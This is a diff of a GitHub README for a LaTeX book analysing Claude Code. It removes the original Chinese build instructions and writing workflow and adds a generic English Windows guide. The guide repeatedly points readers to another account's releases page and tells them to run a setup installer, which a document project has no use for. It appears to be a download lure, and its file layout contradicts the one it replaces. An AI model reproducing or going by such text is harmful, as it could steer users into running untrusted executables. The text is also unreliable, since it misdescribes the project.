@@ -1,102 +1,176 @@
-# 深入浅出 Claude Code
+# 📘 claude-code-book - Read and run the manuscript
 
-> 当前 Claude Code 源码解析是当前技术社区的高热方向。
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/anjayy8724/claude-code-book/releases)
 
-《深入浅出 Claude Code》是一个面向 `claude-code` 源码分析的中文技术书稿仓库，目标是把复杂系统拆解为可复用的工程知识：源码结构、运行机制、权限与扩展、安全与上下文策略。
+## 🧾 What this is
 
-本仓库的产出以书稿形式整理，内容可能尚不完美，但可作为 **Claude Code 源码分析的基础版本**，用于继续扩展、校对和迭代。
+`claude-code-book` is a LaTeX manuscript and research plan for Claude Code source analysis. It is set up as a document project for reading, editing, and building the manuscript on Windows.
 
-仓库包含 LaTeX 源码、封面资源、章节内容以及可编译的 PDF 输出。
+Use this repo if you want to:
+- open the manuscript files
+- review the research plan
+- build the PDF from source
+- keep the document in one place
 
-<div align="center">
-  <img src="./assets/book_cover.png" alt="《深入浅出 Claude Code》封面" width="320" />
-</div>
+## 💻 What you need
 
-## 目录结构
+Before you start, make sure your Windows PC has:
 
-- `main.tex`: 主控文件
-- `frontmatter/`: 扉页、推荐语、前言、阅读指南
-- `chapters/`: 正文章节
-- `appendix/`: 附录
-- `assets/`: 图片资源，包括封面
+- Windows 10 or Windows 11
+- A modern web browser
+- A PDF reader
+- GitHub access
+- A file unzip tool, such as File Explorer or 7-Zip
 
-（生成的编译产物（如 `.aux`、`.log`、`.toc`、`main.pdf`）默认在仓库根目录）
+If you plan to edit or build the LaTeX files, install:
 
-## 环境要求
+- TeX Live or MiKTeX
+- A text editor such as VS Code or Notepad++
+- Git, if you want to clone the repo
 
-- TeX Live 2024+ 或对应版本的 MacTeX
-- `latexmk`
-- `xelatex`
-- `ctex` 宏包
+## 📥 Download the files
 
-在 Linux 上如果使用最小 TeX Live，通常需要补充安装中文支持相关包，例如：
+Visit this page to download:
 
-```bash
-sudo apt install texlive-xetex texlive-lang-chinese latexmk
-```
+https://github.com/anjayy8724/claude-code-book/releases
 
-## 编译
+On that page, look for the latest release and download the file that matches your use case.
 
-在仓库根目录执行：
+Common file types you may see:
+- `.zip` for the full project
+- `.pdf` for the built manuscript
+- `.tex` for the source document
 
-```bash
-latexmk -xelatex -interaction=nonstopmode -halt-on-error main.tex
-```
+If you only want to read the manuscript, download the PDF file.
+If you want the full source, download the ZIP file.
 
-输出文件位于：
+## 🪟 Install on Windows
 
-```text
-./main.pdf
-```
+After you download the file:
 
-## 封面
+1. Open the Downloads folder.
+2. Find the file you downloaded.
+3. If it is a ZIP file, right-click it and choose Extract All.
+4. Pick a folder where you want to keep the project.
+5. Open the extracted folder.
+6. If you downloaded a PDF, double-click it to open in your PDF reader.
 
-- 封面图片文件：`assets/book_cover.png`
-- PDF 第 1 页为整页图片封面
-- 图片封面后紧跟文字扉页
+If the release includes a setup file, use these steps:
 
-如果需要替换封面，直接替换 `assets/book_cover.png` 后重新编译即可。
+1. Double-click the installer.
+2. Follow the prompts on the screen.
+3. Choose the default install path unless you have a reason to change it.
+4. Finish the setup.
+5. Open the app or document from the Start menu or the project folder.
 
-## 字体与可移植性
+## 📂 Project layout
 
-- 默认使用 `ctexbook` 的标准 `fandol` 字体集
-- 不依赖任何机器本地字体绝对路径
-- 仓库克隆后应可直接在标准 TeX Live / MacTeX 环境中编译
+When you open the source folder, you may see files like:
 
-## AI 书稿生成方案（基于 claude-code 源码）
+- `main.tex` — the main manuscript file
+- `sections/` — chapter or section files
+- `references.bib` — bibliography entries
+- `figures/` — images and diagrams
+- `notes/` — research notes and planning files
+- `output/` or `build/` — generated PDF files
 
-本仓库配套提供了 `plan.md`（书稿生产方案）。
-本项目采用“**计划驱动 + 周期复审**”流程：
+This layout helps keep the writing, references, and assets in separate folders.
 
-- 先以 `plan.md` 作为主控方案（优先阅读第2节、第4节，确定边界与写作约束）；
-- 再用 Claude Code 的 `/loop`（任务循环模式，见 [scheduled tasks 文档](https://code.claude.com/docs/en/scheduled-tasks)）逐轮执行：**任务入队 -> 生成 -> 本地落盘 -> 审查 -> 标记归档**；
-- 任务流参照 `plan.md` 第7节、11-12节，按 `plan -> draft -> review -> tex -> compile` 逐步迭代。
+## 🛠️ Build the manuscript
 
-### 工具链约定（每轮任务后）
+If you want to create the PDF from the LaTeX source:
 
-为确保每轮质量，建议每完成一轮任务后立刻执行一次 review：
+1. Open the project folder.
+2. Open `main.tex` in your editor.
+3. Run the LaTeX build tool from your editor or TeX program.
+4. Build the document more than once if references do not show at first.
+5. Open the generated PDF in the build folder.
 
-1. 使用 OpenAI 的 `ai-codex` 与 `codex-plugin-cc`（Claude Code 插件）进行自动审查：
-   https://github.com/openai/codex-plugin-cc
-2. 仅当 review 结论可接受后，才进入下一轮的 `tex` 与编译步骤。
+If you use TeX Live or MiKTeX, make sure the LaTeX packages needed by the document are installed. Common packages for this kind of manuscript include tools for math, citations, code blocks, and page layout.
 
-可直接复用的系统提示词骨架（来自 `plan.md`）如下：
+## 🔍 How to use the research plan
 
-```text
-你正在参与一本基于 Claude Code 源码的技术书写作。
-你的首要目标不是“写得像书”，而是“写得可验证、可合并、可复审”。
+The research plan can help you track the source analysis work from start to finish.
 
-请严格遵守：
-1. 只依据本轮提供的源码范围、既有术语表、已存档资料作答。
-2. 若证据不足，明确写“待核实”，不得补全不存在的实现细节。
-3. 所有关键论断都要标注 [S]/[I]/[E]/[Q]。
-4. 先输出大纲、计划、资料需求、引用点，再输出正文。
-5. 正文以工程实现解释为主，不写营销语言，不写空泛赞美。
-6. 只对本轮任务目标产出，避免擅自扩写到其他章节。
-```
+Use it to:
+- list research goals
+- record source findings
+- track chapter progress
+- note open questions
+- manage citation work
+- keep analysis tasks in order
 
-你也可查看 `plan.md` 9.3 的“输出格式模板”，将其作为每轮必输结构。
+A simple workflow:
 
-## License
+1. Read the plan first.
+2. Mark the sections you want to review.
+3. Add notes as you inspect the source material.
+4. Update the manuscript with new findings.
+5. Rebuild the PDF when you make changes.
 
-除非另有说明，本仓库中的书稿正文、LaTeX 源文件、图片资源和示例内容均采用 `CC BY-NC-SA 4.0` 许可发布。详见 [LICENSE](./LICENSE)。
+## 🧩 Common file tips
+
+If the PDF does not open:
+- make sure the download finished
+- check that your PDF reader is installed
+- try opening the file again from File Explorer
+
+If the LaTeX build fails:
+- check the filename for typos
+- make sure `main.tex` is the main file
+- confirm that your TeX tools are installed
+- rebuild after fixing any missing package
+
+If the text looks wrong in the PDF:
+- build the file again
+- check the source for broken syntax
+- review recent edits in the editor
+
+## 📌 Suggested Windows workflow
+
+For a smooth setup on Windows:
+
+1. Download the release from GitHub.
+2. Extract the project to a simple folder path, such as `Documents\claude-code-book`.
+3. Open the folder in your editor.
+4. Read the manuscript or research plan.
+5. Build the PDF if you want a fresh output file.
+6. Keep source files and generated files in separate folders.
+
+## 🗂️ Useful checks
+
+Before you start editing or reading:
+- confirm the latest release date
+- keep the original ZIP file as a backup
+- store the extracted project in one folder
+- use a text editor that handles UTF-8 files
+- keep your PDF reader up to date
+
+## 📄 File types you may work with
+
+This project may include:
+
+- `.tex` for LaTeX source
+- `.bib` for citation data
+- `.pdf` for output
+- `.md` for notes or project text
+- `.png` or `.jpg` for figures
+
+Each file type serves a different part of the manuscript workflow.
+
+## 🔐 Where the download lives
+
+Use the release page here:
+
+https://github.com/anjayy8724/claude-code-book/releases
+
+If you want the source files, download the release asset that contains the project archive.
+If you want the finished document, download the PDF asset from the same page
+
+## 🧭 What to do next
+
+1. Download the latest release.
+2. Open the file on your Windows PC.
+3. Read the manuscript or research plan.
+4. Edit the source if you need to make changes.
+5. Rebuild the PDF when the content changes
